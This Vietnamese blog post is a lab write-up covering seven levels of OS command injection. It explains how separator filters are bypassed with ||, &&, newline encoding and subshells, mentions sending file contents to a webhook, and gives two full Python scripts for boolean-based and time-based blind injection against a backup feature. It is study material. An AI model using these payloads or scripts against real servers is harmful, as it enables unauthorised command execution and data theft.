---
layout: post
title:  "OS Command Injection"
date:   2026-01-27 14:51:00 +0700
tags: WPT
categories: jekyll update
---

## 🧪 Level 1

---

![image.png](/assets/images/WPT/OsCommand/image.png)

Đến với level 1 này mình có 3 chức năng là:

- **`nslookup`**
- **`ping`**
- **`dig`**

![image.png](/assets/images/WPT/OsCommand/image%201.png)

Mình tiến hành đọc source của nó.

![image.png](/assets/images/WPT/OsCommand/image%202.png)

Tại dòng 3 và 4 nhận vào **`command`** và **`target`** , **`command`** thì ứng với các chức năng là **`ping`** , **`nslookup`** và **`dig`** 

Và sau đó nhận vào **`target`** đây là user input để thực hiện trong hàm **`shell_exec()` →** đây là hàm cho phép thực hiện lệnh **`command`** dưới **`OS`.**

Nếu mình chọn chức năng **`ping`** và thực hiện chèn thêm ký tự để thực hiện nối dài câu lệnh cho **`OS`** thực hiện thì sao ❓❓ 

![image.png](/assets/images/WPT/OsCommand/image%203.png)

Như vậy nó đã thực hiện được lệnh **`ls -lia`**, mình đã thay đổi câu lệnh bằng cách ngắt câu lệnh **`ping`** bằng **`;`** và sau đó nối dài ra.

Từ đây mình có thể thực hiện đọc những file bí mật bất kỳ đâu.

![image.png](/assets/images/WPT/OsCommand/image%204.png)

## 🧪 Level 2

---

![image.png](/assets/images/WPT/OsCommand/image%205.png)

Nhưng tương tự như level 2 → cho nên mình sẽ đọc source. 

![image.png](/assets/images/WPT/OsCommand/image%206.png)

Tại dòng **`5`** đã bị chặn dầu **`;`** , cho nên mình có thể thực hiện truyền vào các dấu **`||`** hoặc **`&&`** để nối dài câu lệnh. Mình có thể đọc thêm từ link này để có biết thêm nhiều về câu lệnh. 

- https://www.gnu.org/software/bash/manual/html_node/index.html#SEC_Contents

![image.png](/assets/images/WPT/OsCommand/image%207.png)

Câu lệnh **`ping`** đã ko thực hiện được thì nó sẽ thực hiện câu lệnh thứ hai mình truyền vào. Hoặc mình có thể dùng **`&&`** 

![image.png](/assets/images/WPT/OsCommand/image%208.png)

Như vậy mình đã quyền để thực hiện đọc toàn bộ file ở mọi nơi mình muốn.

![image.png](/assets/images/WPT/OsCommand/image%209.png)

## 🧪 Level 3

---

![image.png](/assets/images/WPT/OsCommand/image%2010.png)

Quan sát source thì mình đã bị chặn **`;`** , **`&`** và **`|`** 

Nhưng trong **`os`** nó vẫn sẽ hiểu nếu mình xuống dòng. 

Cho nên mình sẽ truyền **`\n`** khi encode nó sẽ thành **`%0a`**

![image.png](/assets/images/WPT/OsCommand/image%2011.png)

Hoặc mình có thể dùng **sub Command**

- **`$()`**

![image.png](/assets/images/WPT/OsCommand/image%2012.png)

- **``**

![image.png](/assets/images/WPT/OsCommand/image%2013.png)

Như vậy mình đã có thể đọc file tùy ý trên server. 

![image.png](/assets/images/WPT/OsCommand/image%2014.png)

## 🧪 Level 4

---

Tại level này khá khác mình chỉ có một chức năng là backup. Các chức năng đã bảo trì.

![image.png](/assets/images/WPT/OsCommand/image%2015.png)

Mình tiến hành đọc source code. 

![image.png](/assets/images/WPT/OsCommand/image%2016.png)

Quan sát dòng **`7`** thì nó thực hiện **`zip`** một folder nhận vào một **`$target`** 

> Cấu trúc của lệnh zip:**`zip <ten_file_zip> <file_mun_zip>`**
> 

Khi lệnh **`zip`** thành công thì nó sẽ in ra **`Backup thành công`**  và ngược lại thì in **`Backup không thành công`** 

Cho nên mình sẽ thực hiện truyền tên file zip là **`Backup.zip`** để xem hành vi của nó.

![image.png](/assets/images/WPT/OsCommand/image%2017.png)

Dựa vào hai dấu hiệu in ra như trên mình có ý tưởng ghi toàn bộ nội dung vào một file sau đó gửi ra ngoài internet. 

![image.png](/assets/images/WPT/OsCommand/image%2018.png)

Quan sát tại webhook. 

![image.png](/assets/images/WPT/OsCommand/image%2019.png)

Như vậy thì có thể thực hiện đọc file sau đó gửi sang internet.

![image.png](/assets/images/WPT/OsCommand/image%2020.png)

## 🧪 Level 5

---

![image.png](/assets/images/WPT/OsCommand/image%2021.png)

Tương tự như level 4 mình cũng có chức năng **`backup`** 

![image.png](/assets/images/WPT/OsCommand/image%2022.png)

Nhưng lần này khi đó trước khi đi vào mình sẽ phải đi qua một proxy. 

![image.png](/assets/images/WPT/OsCommand/image%2023.png)

Proxy này giống như một tấm khiêng bảo vệ, nó khá giống như khi con muốn đi chơi với bạn thì phải xin phép ba mẹ. 

Quan sát config trên server này.

![image.png](/assets/images/WPT/OsCommand/image%2024.png)

Tại dòng **`13`** thì mình có quyền write vào trong **`DocumentRoot`**.

Như vậy mình thực thiện như level 4 nhưng không gửi ra internet mà ghi vào trong **`DocumentRoot`**.

![image.png](/assets/images/WPT/OsCommand/image%2025.png)

Sau đó mình truy cập vào file **`exploit.txt`**

![image.png](/assets/images/WPT/OsCommand/image%2026.png)

## 🧪 Level 6

---

![image.png](/assets/images/WPT/OsCommand/image%2027.png)

Mình review source code. 

![image.png](/assets/images/WPT/OsCommand/image%2028.png)

Vẫn tương tự như các level ở trên. Và nó cũng đi qua một proxy.

![image.png](/assets/images/WPT/OsCommand/image%2029.png)

Tại level này mình cũng không có quyền ghi vào trong **DocumentRoot**

Và mình cũng không có thể curl ra internet. Vì đã có config outbound của proxy.

Mình chỉ có thể dựa vào hành vi của lệnh **`zip`** , khi đúng thì nó in ra **`Backup thành công`** 

Trong các lệnh của **`os`** thì mình có thể tìm file bằng wildcard. 

![image.png](/assets/images/WPT/OsCommand/image%2030.png)

Và mình cũng hoàn toàn đặt biến để thực hiện một lệnh gì đó. 

![image.png](/assets/images/WPT/OsCommand/image%2031.png)

Với ý tưởng như vậy thì mình có dò xem từng chữ của tên file nếu đúng thì nó sẽ in ra **`Backup thành công`**, còn sai thì nó in **`Backup không thành công`** 

Nhưng đầu tiên mình cần thử lấy ký tự đầu tiên của file như thế nào. 

![image.png](/assets/images/WPT/OsCommand/image%2032.png)

Như vậy với ý tưởng này mình thực hiện viết một đoạn script dể nó có thể duyệt qua hết các chữ cái ở tên file. 

```python
import requests
import string
import sys 

def send_request(payload):
    burp0_url = "http://192.168.116.129:3006/index.php"
    burp0_headers = {"X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36", "Origin": "http://192.168.116.129:3006", "Referer": "http://192.168.116.129:3006/", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"command": "backup", "target": f"{payload}"}
    data = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return data 

path_filename = ""

for i in range(1, 25):
    found = False 
    for c in string.ascii_letters + string.digits + "._-/":
        payload = f"backup.zip --help; cmd=`ls /*txt | cut -c {i}`; if [ $cmd = '{c}' ]; then echo 'Backup thanh cong'; else echo 'zip error'; fi; %23"
        send_data = send_request(payload)
        if "Backup thành công" in send_data.text:
            path_filename += c 
            sys.stdout.write("\r[+] Finding filename: " + path_filename)
            sys.stdout.flush()
            found = True
            break 
    if not found:
        break 

print("\n[+] Done: ", path_filename)

```

Sau khi chạy script thì mình thu được filename. 

![image.png](/assets/images/WPT/OsCommand/image%2033.png)

Sau đó mình lấy nội dung của file này, bằng cách tương tự. 

![image.png](/assets/images/WPT/OsCommand/image%2034.png)

## 🧪 Level 7

---

![image.png](/assets/images/WPT/OsCommand/image%2035.png)

Mọi cấu hình tương tự như level 6 đều đi qua proxy và không thể kết nối internet. 

Nhìn kỹ tại dòng **`9`** thì đã thay thể bằng dòng chỉ in ra **`Da chay cau lenh bakup`** , đến đây thì mình nghĩ đến sự nhanh hay chậm của chương trình.

Mình thực hiện thử truyền **`sleep`** và xem phản ứng của server.

![image.png](/assets/images/WPT/OsCommand/image%2036.png)

Như vậy thì nó đã **`sleep`** hơn 5 giây nghĩa là server đã thực hiện. 

- https://www.freecodecamp.org/news/bash-sleep-how-to-make-a-shell-script-wait-n-seconds-example-command/

Vậy mình dựa vào cách level 6 để thực hiện để lấy file. 

```python
import requests
import string
import sys
import time

def send_request(payload):
    burp0_url = "http://192.168.116.129:3007/index.php"
    burp0_headers = {"X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36", "Origin": "http://192.168.116.129:3006", "Referer": "http://192.168.116.129:3006/", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"command": "backup", "target": f"{payload}"}
    start_time = time.time()
    data = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return time.time() - start_time

pathname = ""

THREADHOLD = 0.75

for i in range(1, 25):
    found = False 
    for c in string.ascii_letters + string.digits + "._-/":
        payload = f"backup.zip --help; cmd=`ls /*.txt | cut -c {i}`; if [ $cmd = '{c}' ]; then sleep 1; else sleep 0.1; fi; %23"
        
        delay = send_request(payload)
       
        if delay > THREADHOLD:
            pathname += c 
            sys.stdout.write("\r[+] Finding content: " + pathname)
            sys.stdout.flush()
            found = True
            break 
    if not found:
        break 

print("\n🧪 Done: ", pathname)
```

Sau đó mình đã lấy được **`pathname`** 

![image.png](/assets/images/WPT/OsCommand/image%2037.png)

Rồi mình thử đọc file tương tự như cách tìm path_filename

![image.png](/assets/images/WPT/OsCommand/image%2038.png)